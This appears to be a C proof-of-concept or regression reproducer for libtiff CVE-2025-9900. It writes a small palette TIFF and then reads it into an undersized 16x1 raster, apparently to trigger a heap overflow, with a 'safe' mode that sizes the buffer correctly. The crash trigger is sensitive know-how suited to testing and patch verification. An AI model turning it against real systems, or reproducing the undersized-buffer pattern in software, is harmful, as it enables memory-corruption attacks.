#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tiffio.h>

int main(int argc, char **argv)
{
    const char *path = argc > 1 ? argv[1] : "cve-2025-9900.tif";
    int safe_dimensions = argc > 2 && strcmp(argv[2], "safe") == 0;
    TIFF *writer = TIFFOpen(path, "w");
    if (writer == NULL) return 2;

    const uint32_t image_width = 16, image_height = 16;
    TIFFSetField(writer, TIFFTAG_IMAGEWIDTH, image_width);
    TIFFSetField(writer, TIFFTAG_IMAGELENGTH, image_height);
    TIFFSetField(writer, TIFFTAG_BITSPERSAMPLE, 8);
    TIFFSetField(writer, TIFFTAG_SAMPLESPERPIXEL, 1);
    TIFFSetField(writer, TIFFTAG_PHOTOMETRIC, PHOTOMETRIC_PALETTE);
    TIFFSetField(writer, TIFFTAG_ORIENTATION, ORIENTATION_TOPLEFT);
    TIFFSetField(writer, TIFFTAG_PLANARCONFIG, PLANARCONFIG_CONTIG);
    TIFFSetField(writer, TIFFTAG_ROWSPERSTRIP, image_height);

    uint16_t red[256], green[256], blue[256];
    for (unsigned i = 0; i < 256; ++i) {
        red[i] = green[i] = blue[i] = (uint16_t)(i * 257);
    }
    TIFFSetField(writer, TIFFTAG_COLORMAP, red, green, blue);
    uint8_t row[16];
    for (uint32_t y = 0; y < image_height; ++y) {
        for (unsigned x = 0; x < sizeof(row); ++x) row[x] = (uint8_t)((x + y) & 15);
        if (TIFFWriteScanline(writer, row, y, 0) < 0) return 3;
    }
    TIFFClose(writer);

    TIFF *reader = TIFFOpen(path, "r");
    if (reader == NULL) return 4;
    const uint32_t raster_width = 16;
    const uint32_t raster_height = safe_dimensions ? 16 : 1;
    uint32_t *raster = calloc((size_t)raster_width * raster_height, sizeof(*raster));
    if (raster == NULL) return 5;
    int result = TIFFReadRGBAImageOriented(reader, raster_width, raster_height,
                                           raster, ORIENTATION_TOPLEFT, 0);
    printf("read_result=%d raster=%ux%u\n", result, raster_width, raster_height);
    free(raster);
    TIFFClose(reader);
    return 0;
}
